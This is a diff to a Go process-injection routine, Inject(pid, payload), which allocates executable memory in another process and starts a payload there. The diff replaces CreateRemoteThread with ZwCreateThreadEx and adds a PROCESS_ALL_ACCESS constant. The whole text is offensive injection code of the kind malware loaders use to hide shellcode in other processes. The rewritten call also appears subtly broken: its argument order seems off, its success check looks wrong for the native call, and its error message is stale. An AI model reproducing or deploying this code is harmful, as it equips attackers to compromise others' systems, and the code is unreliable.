@@ -18,6 +18,7 @@ const (
 	MEM_RESERVE               = 0x2000
 	MEM_COMMIT                = 0x1000
 	PAGE_EXECUTE_READWRITE    = 0x40
+	PROCESS_ALL_ACCESS        = 0x1F0FFF
 )
 
 func Inject(pid int, payload []byte) error {
@@ -37,7 +38,8 @@ func Inject(pid int, payload []byte) error {
 	if err != nil {
 		return fmt.Errorf("err locating VirtualAllocEx -> %s", err)
 	}
-	createThread, err := kernel.FindProc("CreateRemoteThread")
+	// createThread, err := kernel.FindProc("CreateRemoteThread")
+	createThread, err := kernel.FindProc("ZwCreateThreadEx")
 	if err != nil {
 		return fmt.Errorf("err locating CreateRemoteThread -> %s", err)
 	}
@@ -69,8 +71,19 @@ func Inject(pid int, payload []byte) error {
 	}
 
 	// call new thread on payload
+	/*
+		Original CreateThread...
+		status, _, _ := createThread.Call(
+			remoteProc, uintptr(0), 0, remoteMem, uintptr(0), 0, uintptr(0),
+		)
+	*/
+	outPtr := 0
 	status, _, _ := createThread.Call(
-		remoteProc, uintptr(0), 0, remoteMem, uintptr(0), 0, uintptr(0),
+		uintptr(unsafe.Pointer(&outPtr)),
+		PROCESS_ALL_ACCESS,
+		remoteProc,
+		remoteMem,
+		uintptr(0), 0x04, 0, 0, 0, uintptr(0),
 	)
 	if status == 0 {
 		return errors.New("could not inject into given process")
